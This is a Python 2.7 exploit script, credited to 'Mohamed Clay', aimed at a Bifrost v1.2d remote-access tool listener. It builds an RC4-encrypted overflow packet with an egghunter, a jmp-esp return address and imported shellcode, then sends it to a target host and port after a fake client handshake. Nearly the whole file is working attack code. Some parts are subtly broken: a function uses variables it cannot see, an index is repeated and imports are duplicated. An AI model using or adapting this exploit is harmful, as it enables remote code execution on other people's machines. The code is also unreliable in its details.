#!/usr/bin/python2.7
#By : Mohamed Clay
import socket
from time import sleep
from itertools import izip, cycle
import base64
import threading
import sys

def rc4crypt(data, key):
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = 0
    y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    
    return ''.join(out)

def bif_len(s):
    while len(s)<8:
         s=s+"00"
    return s

def header(s):
      a=(s[0]+s[1]).decode("hex")
      a+=(s[2]+s[3]).decode("hex")
      a+=(s[4]+s[5]).decode("hex")
      a+=(s[5]+s[6]).decode("hex")
      return a

def random():     
    a="" 
    for i in range(0,8):
        a+="A"*1000+"|"
    return a


def exploit():
    s.sendall(out)


import socket
from payload import buf
import sys
def shell_attack(target_machine, target_port):
    HOST=target_machine
    PORT=target_port

    key=b"\xA3\x78\x26\x35\x57\x32\x2D\x60\xB4\x3C\x2A\x5E\x33\x34\x72\x00"

    xor=b"\xB2\x9C\x51\xBB" # we need this in order to bypass 0046A03E function
    eip=b"\x53\x93\x3A\x7E" # jmp esp User32.dll

    egghunter = b"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";

    #calc.exe shellcode (badchars "\x00")



    raw=(1000-533-len(egghunter))*b"\x90"
    raw2=(1000-8-len(buf))*b"\x41"+b"|"
    command=30


    tmp=hex(command).split(b"0x")[1]
    data=tmp.decode("hex")+"F"*2+" "*511+xor+"C"*12+eip+"A"*8+egghunter+raw+"|"+" "*1000+"|"+"w00tw00t"+buf+raw2+random()
    out=rc4crypt(data,key)
    l=header(bif_len(str(hex(len(data))).split("0x")[1]))
    out=l+out


    data2="2192.168.1.1|Default|Mohamed Clay|Mohamed Clay|p1.2d||0|-1|0|0000|0|1|0|0|000000|C:\|C:\|C:\|MA|00000000|BifrosT v1.2d|"
    out2=rc4crypt(data2,key)
    l=header(bif_len(str(hex(len(data2))).split("0x")[1]))
    out2=l+out2

    th = threading.Thread(name='exploit', target=exploit)
    th.setDaemon(True)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.sendall(out2)
    th.start()
    s.recv(1024)
    